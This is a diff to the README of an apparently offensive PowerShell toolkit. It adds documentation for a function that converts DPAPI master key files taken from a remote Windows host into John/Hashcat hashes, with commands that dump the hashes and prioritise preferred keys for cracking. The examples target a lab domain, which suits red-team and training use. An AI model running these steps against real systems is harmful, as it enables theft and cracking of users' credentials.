@@ -521,6 +521,27 @@ Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Us
 Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserNtlmHash '0123456789abcdef0123456789abcdef'
 ```
 
+#### Get-TBODpapiMasterKeyHashes
+
+Formats DPAPI master key files into John/Hashcat `$DPAPImk$...` hashes for offline password cracking.
+Use `HashLine` (`{GUID}:$DPAPImk$...`) as the primary output for John/Hashcat.
+When a `Preferred` file is present, `IsPreferred` indicates the current preferred key.
+When a `BK-*` file is present in a user Protect directory, the hash context is set to 3 (domain); otherwise 1 (local).
+
+```powershell
+Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol
+
+# Dump only the John/Hashcat lines to a file
+Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol |
+  Select-Object -ExpandProperty HashLine |
+  Set-Content -Encoding ascii .\dpapi-masterkey-hashes.txt
+
+# Crack preferred keys first
+Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol |
+  Where-Object IsPreferred |
+  Select-Object -ExpandProperty HashLine
+```
+
 #### Find-TBODpapiBlobs
 
 Searches file system and registry paths for DPAPI blobs by looking for the DPAPI magic header in the first 1024 bytes.
